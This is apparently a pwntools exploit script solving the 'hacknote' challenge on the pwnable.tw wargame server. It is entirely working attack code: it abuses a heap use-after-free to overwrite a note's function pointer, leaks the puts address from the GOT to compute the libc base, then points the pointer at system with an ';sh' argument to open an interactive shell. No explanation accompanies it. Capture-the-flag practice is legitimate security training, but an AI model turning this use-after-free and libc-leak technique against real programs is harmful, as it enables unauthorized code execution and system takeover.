from pwn import *
context.log_level = 'debug'
prog = './hacknote'
elf = ELF(prog)
#p = process(prog)
p = remote("chall.pwnable.tw", 10102)
libc = ELF("./libc_32.so.6")
'''
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
'''
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendlineafter("choice :", '1')
	p.sendlineafter("size :", str(size))
	p.sendafter("Content :", content)
def show(idx):
	p.sendlineafter("choice :", '3')
	p.sendlineafter("Index :", str(idx))
def free(idx):
	p.sendlineafter("choice :", '2')
	p.sendlineafter("Index :", str(idx))
def exp():
	add(0x20, 'a')
	add(0x20, 'a')
	free(0)
	free(1)
	add(0x8, p32(0x804862b)+p32(elf.got['puts']))
	show(0)
	puts_addr = u32(p.recv(4))
	libc_base = puts_addr - libc.sym['puts']
	log.info("libc_base ==> " + hex(libc_base))
	system = libc_base + libc.sym['system']
	free(2)
	add(0x8, p32(system)+';sh\x00')
	show(0)
	p.interactive()
if __name__ == '__main__':
	exp()
